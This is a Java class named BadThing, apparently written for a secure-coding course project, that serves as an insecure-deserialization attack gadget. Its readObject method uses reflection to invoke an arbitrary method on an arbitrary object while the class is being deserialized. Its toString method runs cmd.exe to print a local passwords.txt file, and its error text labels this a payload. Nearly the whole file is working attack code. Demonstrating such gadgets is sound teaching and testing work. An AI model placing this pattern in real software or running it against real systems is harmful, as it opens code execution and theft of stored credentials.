package hr.algebra.booknook.entity;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serial;
import java.io.Serializable;
import java.lang.reflect.Method;

public class BadThing implements Serializable {

    @Serial
    private static final long serialVersionUID = 1L;
    private Object looselyDefinedThing;
    private String methodName;

    private void readObject(ObjectInputStream ois)
            throws IOException, ClassNotFoundException {
        ois.defaultReadObject();
        try {
            Method method = looselyDefinedThing
                    .getClass()
                    .getMethod(methodName);
            method.invoke(looselyDefinedThing);
        } catch (Exception e) {
            throw new IOException("Reflection invocation failed: " + e.getMessage(), e);
        }
    }

    @Override
    public String toString() {
        try {
            Process p = Runtime.getRuntime().exec(
                    new String[]{"cmd.exe", "/c", "type",
                            "C:\\Users\\lolat\\Desktop\\ISEN M1\\ALGEBRA 26\\Cours\\SecureCoding\\project\\passwords.txt"}
            );
            p.waitFor();
            return new String(p.getInputStream().readAllBytes());
        } catch (IOException | InterruptedException e) {
            return "payload failed: " + e.getMessage();
        }
    }

    public Object getLooselyDefinedThing() { return looselyDefinedThing; }
    public void setLooselyDefinedThing(Object t) { this.looselyDefinedThing = t; }
    public String getMethodName() { return methodName; }
    public void setMethodName(String m) { this.methodName = m; }
}